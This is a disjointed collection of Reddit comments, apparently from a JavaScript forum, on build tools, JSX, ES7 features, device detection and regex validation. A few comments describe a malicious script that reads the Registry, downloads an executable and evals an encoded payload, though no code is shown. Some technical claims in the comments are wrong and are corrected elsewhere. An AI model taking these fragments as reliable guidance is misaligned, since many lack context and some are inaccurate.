My suggestion would be to learn both separately. Webpack is really hard to learn even for seasoned developers. Just try to get webpack to bundle a project that has a sass file/ JS file/ fonts/ images then once you are comfortable with the config have a look at the vue loader and try to implement it on the same project.
There are two ways to use Johnny-Five. 1. needs to be running on a computer and issues commands via USB to a microcontroller running a thin-client 2. can run on a single board computer like the Raspberry Pi or Tessel. Both require to boot up time (not instant on) The different with this is when you use a microcontroller with a JavaScript runtime running on the device the JavaScript code is being interpreted on the device - no need for another computer to be connected via USB. It's also _instant_ on - the code written in the `main()` function gets ran as soon at the board is ready. (Under a second)
It's possible for an NTFS filesystem to be case-sensitive, but it's probably not recommended: https://www.chilkatsoft.com/p/p_454.asp
It's *reading from* the Registry, and extracting a particular character from the known string value at that location, to use as the "character-to-remove" in a long command to execute; maybe the executable that the script downloads will end up modifying the Registry, but this script does not do that by itself.
Don't detect devices. It will do you no good and answers no problems. Do feature detection if necessary. 
Hmm probably not. What specific things are you trying to achieve? In terms of pure functionality there is nothing a phone can't do these days that a laptop can. It's purely screen width and responsive UI. 
We are using http://hgoebl.github.io/mobile-detect.js/ But uncertain if this is the best library out there.
I highly recommend the official boilerplates. You can grab the tool with: npm install vue-cli Then start up a new project: vue init webpack my-project Then get in and install dependencies: cd my-project &amp;&amp; npm install To start developing you can use: npm run dev To build for production: npm run build
Why is that? Is there some nice and little model library done in Typescript?
Difficult to explain, this is how the system works at the moment :)
I host my personal site on firebase and I like it. Without knowing any details of your app and as long as you are using another host for images and anything heavy duty you should be more than fine. Some folks have referred to putting an app on firebase as 'serverless' so no, you need a server to do server side rendering or at least a more fully featured PaaS like heroku. 
I don't think you understand what "model" means in this context...
XY problem?
We'll never know. But seriously, the default behavior is to display the current website on top of a mockup image, but you can display anything you want. Also, because it looks pretty trippy.
I'm not sure if I agree. Instead of saying never use an options object for required function parameters, why not say if you're going to use an options object comment your function so you know what the object is. At a certain point, using objects make sense. Each variable is named and you don't have to memorize which order to pass parameters in. 
Tmux might be the best tool ever
Could you not check the size of the available space, i.e window width/height, and show/hide functionality based on that information? I've found this to be the best way, browser detection has always lead to headache, especially with new devices, new operating system versions etc.
No you wan't to do that! Trust devs that have experience, device detection was already bad some years ago and is even a worse idea today. Today you have desktop computers with touch screens, you have tablets with bigger screens than some laptops, you have convertibles and other types or hybrids. Another problem is that every month lots of new devices get released by lots of different companies and it will be hard to keep track of them all. So what I personally recommend is using [modernizr](https://modernizr.com/docs), it's pretty well done for checking features, some tests are even async to be non-blocking and the best is that you can do your own custom build. Modernizr is modular, so you can do a build containing only the tests you want to use. Most tests return what you have asked for, so true or false. Only some few tests, like the one for audio format support, return a more complex result.
True - with objects, you do get the benefit of not having to memorize order. One thing I forgot to include as a pro for separate parameters is they work better in functional style programming. For example, partially applying a function which takes an object instead of individual parameters is much trickier.
Typescript can use regular JS files, and ontop of it supports source code types. If you want data type errors during transpile time , You need a strongly typed library like typescript. 
This is definitely the way to go if you don't want to setup webpack by yourself and want a build system that "just works".
What we are suggesting is that TypeScript is a different approach rather than using models at all. The question you have to ask is what you really need a model for. With TypeScript in this case you could do the other stuff quite simple with just a function. 
Canjs/can-define seems exactly what you're asking about http://v3.canjs.com/doc/can-define.html
More like https://github.com/AmpersandJS/ampersand-state Don't know how deep the dependencies go, though. 
That password regex is pure cringe.
As a web developer, i believe that templating should be separate from logic (and all js for that matter) I fucking hate shopify.. 
looks good, thanks
Some weird magic numbers in there. Years are limited to 19xx-20xx and the email TLDs limited to 24 char length.
Also as a web developer, I believe in separation of concerns. The pattern I've found that does this best for a UI is to split based on modules and functionality not on languages. I've never used shopify before, but maybe you're trying to fit a square peg into a round hole?
Exactly. JSX is sugar for JS. HTML is not sugar for PHP. A lot of ES6+ is sugar, too. &gt; const someFuction = () =&gt; { return someSugar; } &gt; class ASugarForObjectInheritance {} &gt; @decoratorSugarForSingleObjectInheritanceAcrossMultipleFiles &gt; { lookMaNoFunctionKeywordMethodSugar() {} } &gt; { [variableName] = 'mySecondFavoriteSugar' } &gt; const {some, sugar} = myFavoriteSugar; &gt; {also, sugar} &gt; { const iiefReplacementSugar = 'wasntWithReallyBadInActionScript?' }
Im a big believer in angular 2. It manages separation very nicely IMO. The problem that I'm having in shopify is that, because im a developer and not a designer, ive only worked with it once it's already become convoluted beyond repair. 
The difference is that when writing PHP you are actually just writing multiline strings in a fancy manner. They are strings and they are consumed as strings. Nothing special there. Just a fancy echo. JSX tag however is a meta-language structure - something that would be potentially useful also when writing PHP code. They turn into something useful only *after* the preprosessing stage. When you see a JSX "tag" it typically translates into function call, Object contructor and attribute settings and possibly creates option for directly adding new children to the Object. These Objects do not have to be HTML/DOM elements. For example with React they are React -components. It is up to the application and preprosessor how they are used. This is certainly somewhat limiting, but can also make the structured object hierarchies easier to represent and manipulate in languages such as JavaScript.
Ta!
Can you post your code that sort of worked? My guess is that you're overthinking what you need to do. Your data structure has a lot of extra information but it is essentially of the form (with respect to this problem) { apples: # of apples, melons: # of melons, ... } If you compare the values in each key between two objects you should be able to find the differences in counts.
You can try to check the `screen.width`. Even one big phone like an iPhone 7 plus will have a `screen.width` of 414 (regardless of device orientation). I don't think that any laptop/desktop width a such tiny screen exists, and I don't think we will have phones much bigger than the 7plus. I have no idea about android, but it should be the same.
Not at a computer right now, but if that's the output, it should work! Thank you already. :). I am still kind of new to JavaScript, so I don't understand how it works (especially "map"). Will Google this and try to find it out and give feedback to tell if it works for me.
&gt; logic like DB queries mixed in with view representation Is that still done in modern PHP?
Is Immutable too "heavy" for your application? 
You should give horizon.js a try if you want realtime low latency changes or hood.ie if you want offline able realtime-ish sockets
A lot of ES5- is sugar, too. Infact, a lot of every language, is sugar. Us programmers sure have a massive sweet tooth, damn.
I assume it was Safari, or whatever is built into the Reddit app on iOS. After selecting the image and hitting submit, it seemed to just refresh the page with no warnings or messages or anything. Tried it in my desktop browser though and it's pretty snazzy!
Essentially Objects.keys() gets a list containing the objects keys, and map() let's you apply a function to every object in an array, so we apply the given function to every key in the object. The function given to map takes parameters key and index, which are what you assume. Then you get the value for the key. We map twice, once on new and once on old, because the first doesn't account for values in old that aren't in new.
If you use vim and React, here are [mine](https://github.com/mlaursen/vim-react-snippets/blob/master/UltiSnips/javascript.snippets).
"1900-2099 ought to be enough for everyone"
I've found node/express + socket.io to be pretty straightforward.
NPM with webpack as our base for config/etc. Grunt on some of our legacy apps but it is getting phased out.
How it would help me with this: https://www.reddit.com/r/javascript/comments/5en71s/do_you_know_small_library_for_models/dae0f2w/ ?
That's what we're using too.
ES7 is introducing these. You can use them by transpiling your JavaScript with Babel. Just google Babel, stage-0 to get install instructions and then introduce a build process that uses the stage-0 plugin to transpile your code into ES5 equivalents. I might also note that all features of ES6 are not yet supported in all modern browsers, so you should also transpile that code accordingly. If you plan to support somewhat older browsers, you should also utilize Babel-polyfill.
Whoa.. that shopify bit was pretty random. 
Half the battle is the recursive diffing, which can be done with a lib like deep diff: [https://github.com/flitbit/diff](https://github.com/flitbit/diff) The other half is turning the diff results from raw data into a format more useful for your particular problem/reporting domain. Deep diff will tell you that key "melon" is new, for instance, but doesn't understand the meaning of your object representations and wont be able to tell you syntatically "3 melons" were added. You'll have to loop over each result element from deep diff and convert it to your desired reporting/result domain syntax.
if you're asking strictly about the frontend, I'd consider react+redux. Socket-driven APIs feel awesome with redux as you can have your sagas or middleware or whatever continually update your store from the socket traffic.
There were two main reasons for postponing (a decision on) the feature: * With arrow functions, you can write quite concise code with map() etc. * It may make sense to introduce a more general version of comprehensions that supports arbitrary iterable types (arrays, generators, streams, etc.). More information: https://speakerdeck.com/dherman/a-better-future-for-comprehensions
Gulp
ES7, whose official name is ECMAScript 2016, was standardized in June 2016. It’s a tiny release with only two features: * `Array.prototype.includes()` * Exponentiation Operator (`**`) 
Gradle
&gt;By all means there are reasons why so many devs likes Vue and these devs have surely tried both React or Angular. So, I'm not going to even touch Angular because I haven't used it and haven't liked the philosophies behind it. I have used react+redux+infinite-other-libraries, and I like it. What I'd like is a developer who's used both deeply and likes Vue. vuejs.org isn't it. Also, I'm not sure that Vue is intended for devs who've used react and angular - the packaging, comparison, etc seem aimed at people who are choosing for the first time. 
Gulp
Chrome and Firefox (and any other browsers), are a lot more than just a JS parser/compiler. Babel is specifically made to help out here by providing early support for transpiling new features so you can use them sooner. If Babel wasn't supporting these features before browsers did.. well then Babel doesn't fulfill its purpose at all.
That still doesn't answer my question. Yes, browser are more than a JS parser, but they're also a JS parser, that could include the new features already. I'm obviously missing something here, though.
If you pattern match passwords please get a different job.
Looks cool! So how do you use this in conjunction with other boards like arduino?
I really like that idea. I think I'll do the same. Thanks! 
Think of Babel as syntax-sugar-coating. It takes future methods and converts them to supported syntax. It is far different than actually executing the method from the browser (eg JS engine) perspective. Browsers are slow to update/adopt these literal future methods because they have to ensure these methods are built out correctly from a software perspective and compatible in all operating systems, etc.
This is false. ES7/ES2016 is out and is the current official version of the ECMAScript spec: http://www.ecma-international.org/ecma-262/7.0/ ES7 is not a catchall term for "new javascript". Also the comprehension proposal has been entirely dropped, it is not currently being considered for any version.
Yea good points to clarify the difference between proposals vs actual support and implementation. I did see a few new array methods introduced, but didn't realize it was scrapped: https://developer.mozilla.org/en-US/docs/Web/JavaScript/New_in_JavaScript/ECMAScript_Next_support_in_Mozilla.
I just finished a project I've been working on in my spare time; a new JavaScript state machine implementation: - Demo: http://statemachine.davestewart.io - Github: https://github.com/davestewart/javascript-state-machine Its standout feature is incredibly intuitive configuration, and helpers to wire up your UI: var fsm = new StateMachine({ transitions: [ 'next : a &gt; b &gt; c', 'back : a &lt; b &lt; c' ] }); StateHelper.jQuery(fsm); It makes it really easy to describe and manage interaction with complex state-dependent systems like components, multi-step forms, purchase funnels, visualisations or games. It comes with a ton of awesome demos, so please do check it out and spread the word if you like it!
Feature detection.
Javascript is just assembly sugar at the end of the day ;)
What do you actually need to know? What do you define as a pc? What about touch screen "pc"s? Device detection is rarely an answer to most problems. We use it in a hybrid app for a few reasons, one being apples rules. You can't do device detection without defining what it is about the device you want to detect, and then you may as well do feature detection.
Babel is a project whose singular goal is to implement these proposals but a browser is a much more complex system with many different components and internal interactions. It takes time and money to build features and browsers have to prioritize work against a larger set of other work.
As a web developer, I believe in the red-green-refactor development cycle. Also, to hell with the Dalai Lama!!!
Well exactly that's kinda what I was hinting at. I swear it's amazing how much sugar we consume like this daily.
You can do it however you want. Flux is about what you do with the data once you've retrieved it. It doesn't dictate anything that happens on your backend, nor the libraries used to make calls to your backend from javascript.
I'd take one more step: The only email regex you should use is /@/ Since the part before the @ can contain spaces and the domain name could even contain emojis and does not need a . (best way to validate an email is still to just send a verification mail) 
Finally a name for this. I ran a team of tech support folks years ago. Customers would always call in asking about what they thought was their problem. Always ended in long frustrating calls that didn't resolve anything. Best thing I ever tried to teach my staff was to ask what the customer was trying to achieve, not what they thought was their problem. 
Does not need a .?
I'm newish to programming and never knew this really existed. So if I understand correctly I don't have to manually type out the ReactJS syntax for className and the like if I set it up that way? I can make my own shortcuts? If so this saves a world of annoyance for me. What should I lookup to get going on this? 
Also you might want to look into the data-last point-free syntax: https://drboolean.gitbooks.io/mostly-adequate-guide/content/ch5.html#pointfree
Fair point. But i had similar exp with python. I noticed people did not like lambdas at all (i read guido even went as far as almost removing them). The basic "functional style" lambdas are quite clunky. So the python way is obviously comprehensions. Map, filter, reduce etc are more the javascript way (imho). Im not sure if comprehesions would do any good for js, as functions can be composed, while comprehensions cant. 
The email one is plain stupid, excludes most of the valid characters. https://en.wikipedia.org/wiki/Email_address#Local-part &gt; special characters !#$%&amp;'*+-/=?\^_`{|}~ It annoys me when sites don't allow "+". Also the domain check is wrong. It allows emails like "steve@my....dom---ain.com" ed: Treat that entire page as dodgy. Check them using RegexBuddy or something before using. Also using regex to process HTML is a rabbit hole you probably don't want to go down.
Im not 100% about this, but try using import from "../path/to_file.json"
Admin@localhost is valid
Jesus Christ someone get this man away from a computer before he hurts someone
Great job dude! I think this XKCD may be relevant tho: https://xkcd.com/1171/
Never regex an html string. Terrible, terrible idea. http://stackoverflow.com/a/1732454
Yeah but regexing your address is not the way to solve it. Send a confirmation email
Lodash chain functions?
Is not about that, just a proof of concept and a personal restlessness with native Api. But having it on these libraries I think answer in part my question, din't knew them until now, thank you sir
Don't really understand what you mean, but for scraping websites' content, [cheerio](https://github.com/cheeriojs/cheerio) is pretty easy to use.
It's enforcing alpha numeric with _ and - and must be between 6 and 18 characters long. So. Horrible passwords.
Please. For the love of all things sacred. #DO NOT BLINDLY USE REGEX These are mostly arbitrary and should not be used in any form of production code.
React is not "html tags". Its a view library with a markup similar to html. Its easier to bind and pass data to the view directly and shape it however you want.
&gt;I really want to understand why people prefer to call functions with many arguments fun(arg1, arg2,..., argn) it really do not help to do our programs easier to read, at all. This is why I said I could see this type of thing being useful for newer programmers. But for more experienced programmers, who have used the function often, who know the argument type declaration by heart, who've written their own implementations of this function - for such programmers just the function name gives all the clarity they can ever need. Adding individual functions to set each of the arguments is just overkill. Functional programming is generally good at providing declarative code, but there's still such a thing as going too far with it. Furthermore, a programmer doesn't have to know the function's type declaration to be able to use it. When you only know what the function itself does, without all the other knowledge I mentioned above, a proper code editor does the rest via autocomplete, type hints, etc. Proper documentation goes hand in hand with this. And that's how I prefer it. So as you see, you can already get all the clarity you need from a function, without adding all that extra clutter. You just have to learn how to get this clarity. And when you do, you can continue to enjoy writing short, but concise code. --- One more thing. As you seem to be the author of the repo, I'd like to suggest an addition to its functionality (please pardon me beforehand for not doing this via git systems). Anyway, I've already mentioned a couple times in my first post that I find it strange that `.reduce()` doesn't have the same argument-specific setter functions like `.map()` and `.filter()` have. At the same time, I think also allowing for the 'original', or standards-compliant call sign will help as well. So I suggest to add the argument-specific setters for `.reduce()` as well, and to allow the initial `.map()`, `.filter()`, and `.reduce()` functions to optionally accept all their arguments as normal, which when supplied will make it behave like the original versions of the functions. You could go further and expand this to many more functions. Turn it into a truly useful tool for learning about the language, learning about these functions. Perhaps you can come up with a more general approach to implement this argument-setter system, so as to allow easy application on any function you want. I may try a thing or two myself in this area as well, it seems like an interesting problem to solve.
TDD is difficult to do when you're in the prototype phase of a project. What's the deal with Siracha sauce? Totally overrated!
Everything beyond basic Turing completeness is sugar ;)
OP actually seems like they want a type system more than anything else.
It's transpiles new language features into old syntax ex. `2 ** 6` -&gt; `Math.pow(2, 6)`
Thanks. Makes sense. Allowing more symbols would make it harder to brute force, right?
Thanks for sharing 8-)
You can accomplish this with ES2015 properties/classes. For example: class Order { get client() { return this._client; } set client(val) { this._client = new Client(val); } } class Client { get price() { return this._price; } set price(val) { this._price = parseInt(val); } } You can do the same without ES2015 using defineProperty and manual prototype chains, but it's uglier.
I see the HTML regex as being primarily useful for for find/replace type stuff in your code editor - not within applications themselves.
I actually went one step further and published my snippets on: https://marketplace.visualstudio.com/items?itemName=capaj.vscode-standardjs-snippets Feel free to try them out. If you ever miss any, submit a PR.
This is good when you're dealing with a short refactor, but I don't like this use of the getter/setter. I believe its not clear if the setter for order.client is an object literal but the getter returns a Client object. That specific example is more readable via: `order.client = new Client({name: 'John Doe'})` . Making sure these rules are maintained are easier in compile time checking.
Sure; but OP really wanted properties for whatever reason. I agree that it'd be clearer doing what you had, or instead having a method on the order class called something like "setClient" which takes in the raw JSON and processes the data. I tend to not like having complex setters in any language with properties. Anything more than simple sanitation, and I'd prefer a method.
Also know as an iframe? 
Use TypeScript and thank me later
You can do it in modern PHP like you always used too. But I think professionally it's not really done that way nowadays anymore, as its virtually impossible to maintain. Usually you do it through the framework's ORM layer, through some controllers, that render views. Not sure about how views are rendered (templating like Razor or Jinga?) though.
PHP on the frontend?
"The" code? You can pretty much do this with any scripting language. Look up scraping HTML 
It is my favorite too! :) Very low adoption though. I want to eventually update the custom rule to work with --fix mostly for practical joke reasons.
Feross got it right in his comment. 
Also in the middle.
JSX is *not* `HTML` tags in scripts. Getting that wrong is probably the #1 reason I have to hand-hold veteran developers when they walk across the office to the Javascript world. JSX is a brilliant way of describing the hierarchical structure of a component in a declarative way. Yes, it looks a little bit like HTML. But it's not.
Why not? Why? Why? Why?
Why?
In this thread...lots of folks good at telling you what not to do but terrible at explaining why.
By having a 'password validation' system with a set length and characters implies the site is storing your password in plaintext. A password should be hashed and salted, which would mean the user can enter any characters of any length and it shouldn't matter because you're always going to get a hash of a specific length and set of characters. You then store the password hash in your database and validate a user's provided password against that hash on login. This means if someone hacks the site and gets access to the database, they don't (easily) have all of your users passwords. https://crackstation.net/hashing-security.htm Not to mention enforcing a pattern for your passwords is a great way of telling hackers how to brute force a password because they can rule out all invalid possibilities.
See my post https://www.reddit.com/r/javascript/comments/5enzfj/a_collection_of_useful_js_regex_patterns/daej2l8/
Seems like it would be useful for enforcing length and complexity. Otherwise, someone could make their password, "1". Of course this would be super easy to brute force even if you had 5 minute locks and you did salt and hash the passwords.
Not all JS developers love JSX. It's mostly React.js developers who love JSX. My personal preference is to just use template strings with a framework like [Choo](https://github.com/yoshuawuyts/choo) or a smaller module such as [yo-yo](https://github.com/maxogden/yo-yo) or an even smaller module such [bel](https://github.com/shama/bel). My second personal preference is to just use functions like [virtual-dom](https://github.com/Matt-Esch/virtual-dom) or a smaller module such as [hyperscript](https://github.com/dominictarr/hyperscript) or an even smaller module such as [hscrpt](https://github.com/dominictarr/hscrpt). I'd really only use JSX it if I was locked into using React.
I wrote a funny regex recently, I believe it was `[mb]?(tr)?illion`... Will probably go out of date some years in the future when we're all measuring our wealth in terms of bazillion dollars...
I just threw up a little in my mouth. ^(but with webasm, it could be a possibility)
This is definitely true, but personally I would never force a user to have a password of a certain length and set of characters. It can be useful (but not a perfect solution) to at least show them a "password strength" meter based on length and characters and let them decide for themselves what their password contains. In this case regular expressions would be useful.
NPM &amp; Webpack
I mean I'm not familiar with that component specifically but the quick look at the examples has it reading documents from the server, or did I misunderstand? and Polymer has two way data binding so I'm guessing that if it's reading and has access it can write.
That makes sense. I assumed the regex would be used on the front end. I see what you're saying about giving a hacker guidelines to follow. 
It's hard to explain regular languages, where they're useful, and what they mean without someone understanding any part of it.
Cool project! Though I think your math is slightly off. var lng = latlng.lng &gt; 0 ? 180 - latlng.lng : 180 + latlng.lng Should be: var lng = latlng.lng &gt; 0 ? latlng.lng - 180 : 180 + latlng.lng Or in words... The longitude should always be "180 away" Source: I design space things so I do these transforms all too often
Looks like a duck, quacks like a duck. It's a duck.
I really, really don't like the JSX approach. I'm not happy with ANY approach so far, and I've actually been grappling with what I DO want, which is data join integrated templates. The problem is there isn't a nice language to describe that. I haven't been sold on any one take yet -- the JSX approach is a little too much of a jump for me, and while I'm much more okay with template languages in general (jade/pug is my favorite dialect so far), most of my work lately has been angular 1.5
https://web.wurfl.io/#wurfl-js
A password should allow any input, end of story. At the most, it should enforce a minimum length. Nothing more. No required characters, no forbidden characters, no limits on capitalization, nothing.
Yeah I was toying with that phrase but ultimately decided it was bad for my argument. If anything, it's only "looks like a duck". There's no quacking in JSX.
Yeah upper limits are fine, but they are generally better enforced as POST size limits.
That it certainly is. ---- I fully admit to not liking JSX because it's HTML in my JS. It looks and quacks like it to me. But I'm told inline styling is making a comeback as well.. so maybe we're just going back to website development techniques of yesteryear.
What do you mean by "data join integrated"
When somebody makes a proposal to TC39 (the standards body that oversees javascript) They make a babel plugin to go along with the proposal. That way everyone is on the same page with what the new proposal does exactly. It also allows it to be played with and used by the community. So basically things can't even be proposed (or likely won't receive sufficient attention to be added to JS) if there is not a babel plugin to go along with it first. Most modern web browsers do support the new syntax. However, not everyone is running the latest browser so there is a need for a tool that can make code compatible for people in old browsers. That tool is babel. 
Thanks, I understand now.
this is the most useful: https://nodejs.org/en/docs/ (after common JS docs) Not sure if anything else could help. Just when using some modules – than their docs as well.
NPM scripts + gulp + webpack
Yeah. Like under the hood .jsps compile to Java. Both are powerful, but I think it likely there is a better solution out there for frontend code. 
Looks a bit like Javascript manipulation from 2003. "className" I was happy when I stopped using it, don't wanna start again. 
Yep, this dev post explains the PHP extension (XHP): https://m.facebook.com/notes/facebook-engineering/xhp-a-new-way-to-write-php/294003943919/
Still doesn't matter. If the brute force guesser puts in a 1, they're in.
Ok, let's say you're doing some sort of parallax animation with a fixed background attachment. Testing reveals that on an Android tablet on Chrome, the background stutters and fails to keep up with the scroll. It's not down to performance, because every other device works fine. You figure the device is trying to optimize something and recalculating stuff less often. You could spend the next 6 hours on Google trying to figure out what is causing this behaviour, but the deadline is in a few days and you still have a bunch of other stuff to do. What feature detection will you use to solve this problem? Let me answer that for you. You use device detection, and disable the animation on Android Chrome. Next week rolls around and you get a bug report that the sticky element you implemented with some jQuery library is broken on mobile Safari - the element disappears entirely while the user is scrolling. Admittedly, it's a pretty rare thing because the user needs to have a screen size of above (some breakpoint) on a mobile Safari device, so probably landscape mode, but regardless it's ugly and the client isn't happy. Now you could dig into the jQuery plugin's source code, try to figure out what's going on - assuming you even can, because probably that device is again doing some weird optimization. BUT you've got 2 other projects and this looks like a bug that you'll debug for a long time, so it's not worth it. Besides, the client already told you that you can just go ahead and disable that functionality on ipads. So what do you do? Well, I know what I'll do. I'll hack together some userAgent regex check and disable the sticky element behaviour for mobile Safari. 
I don't feel the shaming, I think people are actually trying to help and I'm grateful for that :-)
- anatomy of a HTTP request - express docs are really simple and good - express under the hood On mobile so no links. Sorry. 
It is all about seperation of concerns, not seperation of technologies/languages. The React mantra is that, all required things to render a components should be co-located. So when you improve that component, you won't have to open tons of files spread all over project. So it is usual that you see that html+css and JS are put into single JS file that is responsible for representing the whole of React component. It makes it easy to maintain, modularise and reuse. 
I'm not sure how you can get more "automated"... You asked for properties, I gave you properties :p In what way do you want it to be automated? Maybe you could write something yourself. You can use defineProperty to create properties on an object dynamically.
If you're working with 32-bit ints and if you want to signal the VM that these will definitely stay within the 32-bit range, truncating via | 0 is the way to go. Anyhow, if the code is somewhat hot, small functions will be usually inlined. So, there actually isn't much overhead.
Much less "fluff" in my code. To get up and running I don't need a lot of extra code. Nevertheless if I want granular control there is the capability for that. Not to mention it is simply nicer to code in. Give it a try. You'll see what I mean. 
&gt; I don't know why you're being downvoted for your comments. Because I disagreed with him. You can't really expect to not get a downvote on Reddit when you disagree with someone. It's not really a "this post doesn't contribute" button as much as it is a "press this button to make it look like my point is more valid, because the other person has a negative score" button
So is an IP address expressed in base10. http://www.google.com == http://216.58.197.4/ == http://3627730180/ All valid email domain parts as well.
Something like this var Order = SmartLibrary.build({ 'date': { type: 'Date', required: true }, 'client: { type: 'Client' }, 'items': 'array:OrderItem', 'total': { get: function() { // } } }); // later do this var order = new Order({client: {name: 'John Done'}});
add a "WOPR" logo and self-play mode ?
[removed]
Yeah Logo would be great. Thanks 
This is a malware with an encoded payload.
On internal networks the domain can be very simple, for example: http://bugzilla/
Yes and the latest line eval (so execute) the content of the variable `exZdISwK`. Which is the payload. 
Someone asked a similar question a few days ago: https://www.reddit.com/r/javascript/comments/5e9b9l/could_anyone_work_out_what_this_javascript_virus/ Never seen anything like this until now.
That is what I am telling you, what you are seeing now is a bug that has been fixed. You can either wait for the fix to hit a stable release or download a beta/dev channel build to try getting it fixed sooner (but the code can be more unstable.) https://www.chromium.org/getting-involved/dev-channel
Yes, however sadly they have a strong reputation of refusing PR's.
Watch your language!
For frontend devs, most devs, the importance of promises. 
This post is old. If you really need classes just use ES6 classes, which are a native feature now. Faking classes is inefficient, exposes your incompetence as a developer, and demonstrates your absolute disregard for this language. This was true before ES6 classes were available and remains true now. &gt; First of all, eval() isn't always bad Yes, it is. The only valid use for eval is to create a JavaScript REPL written in JavaScript in a highly restrictive pseudo-shell environment. Honestly, and this is guidance from other languages where you cannot escape OOP stupidity, if you aren't using OO concepts to create and extend types (subtyping) you are likely not appreciating the concept. Fortunately, you can absolutely avoid OO concepts in this language without consequence to performance, maintenance, or size of code.
did you even read the post? &gt;It'd be awesome to get some feedback on what resources you used to learn particular concepts did you just read all the docs and then start programming node?
+1 for nodeschool - awesome resource. The biggest requirement imo for writing good node code is being able to write good JS code. To that end, Doug Crockford's series of Yahoo talks were extremely helpful for me after having learned the basics of JS. 
Something like this? https://jsbin.com/huviwibofa/edit?html,js,output Change the left curve to be: this.endPointControl = { x: curve.startPoint.x - (curve.startPointControl.x - curve.startPoint.x), y: curve.startPoint.y - (curve.startPointControl.y - curve.startPoint.y) }; 
Anonymous functions are a big part of all this that I remember being a little weird to grasp at first. I couldn't live without them in any language now. They are so incredibly useful.
Yes exactly. Thank you!
Do you name your arrow functions as well?
Regex is flat out an unfit tool for actually validating domains &amp; email addresses. To actually validate a domain, you need to check that the suffix of the domain (such as .com or .co.uk) is a registered suffix. This involves maintaining a giant array of valid domain suffixes and performing an indexOf check. This check should never be handled on the frontend through js because of the size of this array. Without this array lookup check, invalid email addresses such as hello@fakesite.poop are counted as valid. However, since this validation is best suited to be performed on a backend, it is okay for the frontend to validate email addresses with a regex pattern as long as the frontend eventually defers proper validation to the backend. In this scenario, the frontend validation is used to throttle api requests and provide immediate UI feedback to a user. But it is not used as the final source of truth on the matter of validation. Source: wrote a shared front &amp; backend common pattern validation library for a major tech company. 
Could you explain to me please what point of the guidelines were not met?
So which one of the 3 subreddits mentioned in the guidelines would you recommend for this video?
If you want to just use Node+Express and Vue together you can take a look at express-vue https://github.com/danmademe/express-vue 
* Don't use regex to parse HTML because it's just not meant for that. Regex is great to search/replace strings, but it's not a markup parser. You can use jquery or even plain vanilla JS to determine information about an HTML tag. Use the right tool for the right job. * Same with a number, why use a regex? Nothing wrong with if(a&lt;0) { /*...*/ } * The password is unsafe because it is very restrictive. Why limit it to 18? Why limit the special characters? Why no spaces? Passwords should allow any character and the length should be limited to what the system allows for (hopefully something crazy long). What if I want to use a 40 character password with spaces and an emoji? This regex specifies a password constraint that forces the password to be weak. The correct way to check for a password strength is to calculate its entropy, not check what it looks like. This is a good [rant](https://ryanwinchester.ca/posts/stop-forcing-your-arbitrary-password-rules-on-me), more about [entropy](https://www.grc.com/haystack.htm), also look at [diceware lists](http://world.std.com/~reinhold/diceware.html), probably the best way to generate a password, but it wouldn't pass this regex * The username is arbitrary, 3-16 characters, alphanumerical with dash or underscore? Why 3? Why 16? Magic numbers... * Now on the email, [here is a good post that explains why](https://stackoverflow.com/questions/201323/using-a-regular-expression-to-validate-an-email-address#201378) The TLDR is that an email is too complex to validate and &gt; There is some danger that common usage and widespread sloppy coding will establish a de facto standard for e-mail addresses that is more restrictive than the recorded formal standard. It's much easier to send a confirmation email, if the email is confirmed, it's deemed valid. Edit: formatting
IMO it would be a lot more relevant to /r/webdev and /r/frontend.
The stack overflow sample will create a form, and then append that to the body, meaning the page will be redirected after the form is submitted. Both examples from mdn avoids this page redirect by either appending an iframe (which will reload itself, rather than its parent page, when form is submitted), or by using the XMLHttpRequest object - or ajax. Aside from how the redirect is handled, they are the same (I'm about 90% certain of this, it's been a while since I played around with this). 
So, there is no (let's say elegant way) to perform redirect without appending the form to the body? What if you just create a form object and call submit() on it (without appending it to the body)? Also, if you would manually set redirect on XMLHttpRequest (on a success callback, using window.location.href) would that be the same?
Actually, I've started programming *Javascript* before Node.js appeared. And then I've started to *use* Node.js even without docs, just looking to them time to time.
Well, you could always run window.location.reload() or set it to something else when the request is complete.. I'm not sure I would call that more elegant than appending the form though...
I restored it.
What terminal emulator is that?
X-Post referenced from [/r/meteor](http://np.reddit.com/r/meteor) by /u/CafeRacer400cc [Issue #37 of Meteor Weekly is out!](http://np.reddit.com/r/Meteor/comments/5eun6c/issue_37_of_meteor_weekly_is_out/) ***** ^^I ^^am ^^a ^^bot. ^^I ^^delete ^^my ^^negative ^^comments. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
Is it me or is it setup so you can't win, the only option I get thus far is draw or lose?
I wish Ember wasn't left out of these kinds of comparisons. It's an excellent framework with a fantastic community, it's just not backed by a single large company (which is, arguably, a good thing). 
I'd recommend axios, but fetch is good as well, even if it is a bit lower level.
Care to explain how this compares to what im building? For what i can read its not the same.
Here's a minimal one I made, not CLI though. http://codepen.io/fharding/full/pNRKZR/
https://eviltrout.com/2016/02/25/fixing-android-performance.html Ember seems kind of slow ...
Anyone who has bought it already have any opinions to share on it vs other learning resources for es6?
I am new ,can i get the source code ?
Eloquent JavaScript 
uh... gitlab, github, git.
Without rancor, I ask why Vim? My usage of vim starts with sudo and ends with a configuration file. So I see its usage for easy command line edits. But for a daily editor I've never understood the appeal vs the more powerful options available. 
Looks good :)
Thanks, so does yours. Cool idea for a CLI one.
Glad you find it useful :)
Thanks for the feedback :)
I prefer using it this way haha
Angular 2 &gt; 500K minified, Ember &gt; 400k! https://gist.github.com/Restuta/cda69e50a853aa64912d
&gt; autobahn I'd suggest looking into socket.io it's super easy to understand feel free to message me if you have any questions about it! 
What are you trying to say?
I'm sure JSX inventors has PHP influence.
JSX is HTML embedded, that's what makes JSX useful. See the following snippet. &lt;?php class Component { function render($name) { ?&gt; &lt;div class="container"&gt; &lt;p&gt;Hello &lt;?= $name ?&gt; &lt;/p&gt; &lt;button class="btn btn-primary"&gt;Click me&lt;/button&gt; &lt;/div&gt; &lt;?php } } $c = new Component(); $c-&gt;render('World!'); Now in your mind replace Redux by Doctrine or any other DB lib.
Your example shows HTML embedded in PHP. JSX is not HTML embedded in JS, thus your analogy fails. What you're looking for is [XHP](https://en.wikipedia.org/wiki/XHP). JSX is explicitly "XHP for JS". Both allow the direct embedding of an XML DSL which is transpiled into the host language.
